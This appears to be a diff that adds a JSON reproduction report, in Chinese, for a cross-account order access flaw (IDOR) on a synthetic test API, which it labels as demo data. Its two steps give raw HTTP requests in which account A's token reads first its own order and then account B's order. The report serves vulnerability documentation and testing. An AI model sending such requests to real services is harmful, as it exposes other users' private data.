@@ -1,0 +1,24 @@
+{
+  "entry_point": "GET https://api.example.test/orders",
+  "prerequisites": [
+    "本地合成演示数据，非真实漏洞；已准备账号A、账号B及各自订单。"
+  ],
+  "steps": [
+    {
+      "title": "读取自己的订单作为对照",
+      "action": "使用账号A会话读取订单1001，确认正常访问结果。",
+      "result": "返回账号A自己的订单。",
+      "proves": "接口可正常读取本人订单。",
+      "request": "GET /orders?id=1001 HTTP/1.1\r\nHost: api.example.test\r\nAuthorization: Bearer DEMO_A\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1001,\"owner\":\"A\"}"
+    },
+    {
+      "title": "保持会话不变，修改订单编号",
+      "action": "仅将订单编号改为账号B的1002，其余请求条件保持一致。",
+      "result": "返回账号B订单的演示内容。",
+      "proves": "演示范围内可跨账号读取指定订单，不推断其他资源。",
+      "request": "GET /orders?id=1002 HTTP/1.1\r\nHost: api.example.test\r\nAuthorization: Bearer DEMO_A\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1002,\"owner\":\"B\"}"
+    }
+  ]
+}
